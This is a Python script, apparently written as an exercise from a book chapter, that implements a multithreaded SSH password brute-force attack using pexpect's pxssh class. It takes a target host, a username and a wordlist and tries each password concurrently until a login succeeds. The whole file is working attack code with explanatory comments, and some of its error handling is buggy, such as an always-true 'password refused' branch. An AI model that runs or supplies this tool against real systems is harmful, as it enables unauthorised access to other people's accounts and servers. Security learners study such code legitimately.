# SSH brute force with pxssh class based on chapter 2
# Python 3.4

'''

Because of PXSSH implementation of ssh connections, every failed attempt will spawn a GUI windows asking for
the Openssh password. I've checked the psxxh file under /usr/local/lib/python3.4/dist-packages/pexpect/pxssh.py
and change it according with the suggestions on:

    http://stackoverflow.com/questions/20832740/python-pxssh-gui-spawn-on-login-failure
    and
    http://stackoverflow.com/questions/28685371/python-2-6-pxssh-password-gui-spawned-on-login-failure

Without success... Every time it executes, the pop-up will came out.

'''


# Pxssh is part of pexpect library. Its a specialized class for set up SSH connections, handling login, logout,
# exceptions, etc...
from pexpect import pxssh
import argparse
import time
import threading


# Define the max number of threads created.
maxConnections = 5
# A semaphore implementation for control the number of threads spawned by the application.
# Useful in controlling access to limited resources.
connection_lock = threading.BoundedSemaphore(value=maxConnections)
# Register if a password was found.
Found = False
# Register the number of connection errors.
Fail = 0


def connect(host, user, password, release):

    # Global's are variable which can be accessed at any place at the script. They are not limited to
    # function scope thereby can be modified and read by anyone.
    global Found
    global Fail

    # Initialize the pxssh class, start the connection with values sent by main() and return true in case of a
    # successful connection.
    try:

        ssh = pxssh.pxssh()
        ssh.login(host, user, password)
        print("[+]Password found: {0}".format(password))
        Found = True

    except Exception as error:

        # The errors defined here are definde by pxssh and not from ssh server.
        # The nonblocking exception is trowed when the server reach its max connection limit.
        if 'read_nonblocking' in str(error):
            Fail += 1
            time.sleep(5)
            connect(host, user, password, False)

        # The synchronize .... exception is trowed when the pxssh fails in obtaining a shell prompt.
        elif 'synchronize with original prompt' in str(error):
            time.sleep(1)
            connect(host, user, password, False)

        # The password refused exception....
        elif 'password refused':
            pass

    finally:

        # After successful connect to the ssh target and verify a password, it will release a lock so another
        # can execute the connect function with a new password. The release doesn't mean that the password was accepted,
        # only that the try was successful.
        if release: connection_lock.release()


def main():

    # Define options and help.
    parser = argparse.ArgumentParser(description="Simple Python SSH Brute Force")
    parser.add_argument('Target', help="Target host.")
    parser.add_argument('User', help="User for ssh connection.")
    parser.add_argument('PassFile', help="File with a password per line.")

    # Receive arguments from user
    args = parser.parse_args()
    tgtHost = args.Target
    user = args.User
    passFile = args.PassFile

    # If anything wasn't set, print the help from argparse and exit.
    if tgtHost == None or user == None or passFile == None:
        print(parser.usage)
        exit(0)

    # I choose this over the books example because it will close the file after the execution,
    # Diethrich Epp explains why in a stackoverflow answer
    # http://stackoverflow.com/questions/11555468/how-should-i-read-a-file-line-by-line-in-python
    with open(passFile, 'r') as passwords:

        for line in passwords.readlines():

            if Found:
                print("[*]Password found...exiting.\n")
                exit(0)

            if Fail > 5:
                print("[-]Too many socket timeouts...exiting")
                exit(1)

            # For each connection attempt it will reserve a resource before run. If no ( maxConnections ) resource is
            # available it will wait until a release occurs.
            connection_lock.acquire()

            # Clear spaces and line breaks before pass it as argument.
            password = line.strip('\r').strip('\n')
            print("[*]Testing password {0}".format(password))

            # Create the thread for its execution. Because its start parallel execution, it will always try one password
            # more than it should need. Execute the script and you'll understand what I mean. It bothers me but I wasn't
            # able to solve it....for now.
            bruteForce = threading.Thread(target=connect, args=(tgtHost, user, password, True))

            # Starts the thread.
            child = bruteForce.start()

if __name__ == '__main__':
    main()